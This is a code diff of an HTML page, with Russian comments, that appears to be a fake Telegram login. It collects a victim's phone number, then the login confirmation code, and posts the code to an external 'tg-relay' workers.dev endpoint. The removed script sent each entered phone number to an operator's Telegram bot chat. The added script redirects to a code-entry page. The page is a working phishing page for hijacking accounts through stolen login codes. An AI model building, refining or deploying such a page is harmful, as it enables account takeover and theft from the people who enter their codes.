@@ -60,29 +60,6 @@
         <button id="nextBtn">Далее</button>
     </form>
 
-    <script>
-        document.getElementById('nextBtn').addEventListener('click', async function() {
-            const phone = document.getElementById('newPhone').value;
-            const env = {}; // Изначально мы не знаем значения env, но это не проблема, так как оно будет
-получено позже.
-
-            if (env.BOT_TOKEN && env.ADMIN_CHAT_ID) {
-                await fetch(`https://api.telegram.org/${env.BOT_TOKEN}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: env.ADMIN_CHAT_ID,
-                        text: `Код входа отправлен на ${phone}.`,
-                    }),
-                });
-            }
-
-            // Сделаем предположение, что после отправки кода пользователю,
-            // форма отправится автоматически на следующую страницу.
-            this.submit();
-        });
-    </script>
-
     <!-- Страница для ввода кода -->
     <form action="https://tg-relay.egor8131723.workers.dev" method="post">
         <label for="code">Код подтверждение:</label>
@@ -90,6 +67,12 @@
         <br>
         <button id="sendBtn">Войти</button>
     </form>
+
+    <script>
+        document.getElementById('nextBtn').addEventListener('click', function() {
+            document.location.href = '/code-page'; // Перенаправление на страницу для ввода кода.
+        });
+    </script>
 
 </body>
 </html>
